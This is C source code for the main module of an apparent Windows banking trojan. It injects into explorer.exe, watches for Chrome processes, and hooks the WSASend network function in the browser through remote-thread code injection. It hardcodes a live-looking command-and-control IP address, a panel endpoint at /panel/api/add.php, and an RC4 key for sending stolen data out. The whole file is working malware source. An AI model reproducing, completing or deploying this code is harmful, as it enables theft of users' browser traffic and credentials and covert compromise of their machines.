#include <Windows.h>
#include "Chrome.h"
#include "Firefox.h"
#include "Internet Explorer.h"
#include <stdio.h>
#include <Psapi.h>
#include "PE Tools.h"
#include "C Runtime.h"
#include <Shlwapi.h>
#include "Injection.h"
#include "ZombieInjection.h"
#include "JSON Constructor.h"
#include "Base64.h"
#include "RC4.h"
#include "Main.h"
#include <TlHelp32.h>



extern char szHostName[256];
extern char szOS[256];
extern char szPage[256];
extern unsigned char EncucKey[256];



DWORD GetPID(wchar_t* szName, DWORD dwName)
{

	PROCESSENTRY32 Proc32;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	DWORD ID = 0;

	Proc32.dwSize = sizeof(Proc32);

	if (Process32First(hSnap, &Proc32))
	{

		do
		{
			if (!StrCmpNW(szName, Proc32.szExeFile, dwName))
			{
				ID = Proc32.th32ProcessID;
				break;
			}
		}
		
		while(Process32Next(hSnap, &Proc32));
	}
	if (hSnap != INVALID_HANDLE_VALUE)
		CloseHandle(hSnap);
	return ID;
}

void InjectCodeIntoBrowser(void* Address, LPTHREAD_START_ROUTINE Target, HANDLE hProc)
{
	unsigned char Buffer = 0;
	if (ReadProcessMemory(hProc, Address, &Buffer,1,0))
	{
		if (Buffer != 0xE9)
		{
			DWORD eInject = Inject(Target, hProc);
			if (eInject)
			{
				HANDLE hThread = CreateRemoteThread(hProc,0,0,(LPTHREAD_START_ROUTINE)eInject,0,0,0);
				if (hThread)
				{
					WaitForSingleObject(hThread, INFINITE);
					CloseHandle(hThread);

				}
			}
		}
	}
}


void Entry()
{
	HANDLE hSnap = 0;

	PROCESSENTRY32 ProcEntry;
	RtlSecureZeroMemory(&ProcEntry,sizeof(PROCESSENTRY32));
	ProcEntry.dwSize = sizeof(PROCESSENTRY32);
MessageBoxA(0,0,0,0);

	while(1)
	{
		hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (Process32First(hSnap, &ProcEntry) && hSnap != INVALID_HANDLE_VALUE)
		{
			do
			{
				if (!StrCmpNW(ProcEntry.szExeFile, L"chrome.exe", strlen("chrome.exe")))
				{
					DWORD dwExplorerPID = GetPID(L"explorer.exe", strlen("explorer.exe"));
					if (dwExplorerPID != ProcEntry.th32ParentProcessID)
					{
						HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcEntry.th32ParentProcessID);
						if (hProc)
						{
							void* lpAddress = GetProcAddress32(LoadLibraryA("Ws2_32.dll"), "WSASend");
							if (lpAddress)
							{
								InjectCodeIntoBrowser(lpAddress, (LPTHREAD_START_ROUTINE)ChromeEntry,hProc);
							}
							CloseHandle(hProc);
						}
					}
				}


			}while(Process32Next(hSnap, &ProcEntry));
			if (hSnap != INVALID_HANDLE_VALUE)
				CloseHandle(hSnap);
			Sleep(5000);
		}

	}

}



int main()
{


	wchar_t szExplorer[MAX_PATH*2+2];
	RtlSecureZeroMemory(szExplorer, sizeof(szExplorer));


	if (GetExplorerDirectoryBasedOnArch(szExplorer))
	{
		if (InitializeZombieInjection())
		{

			RtlSecureZeroMemory(szHostName, sizeof(szHostName));
			m_memcpy(szHostName, "185.4.149.84", strlen("185.4.149.84"));

			RtlSecureZeroMemory(szOS, sizeof(szOS));
			m_memcpy(szOS, "Windows (TBD)", strlen("Windows (TBD)"));

			RtlSecureZeroMemory(szPage, sizeof(szPage));
			m_memcpy(szPage, "/panel/api/add.php", strlen("/panel/api/add.php"));

			RtlSecureZeroMemory(EncucKey, sizeof(EncucKey));
			m_memcpy(EncucKey, "key", strlen("key"));

			if (!StartExplorer32Injection(szExplorer, (LPTHREAD_START_ROUTINE)Entry))
			{

			}
		}
	}
	ExitProcess(0);

}


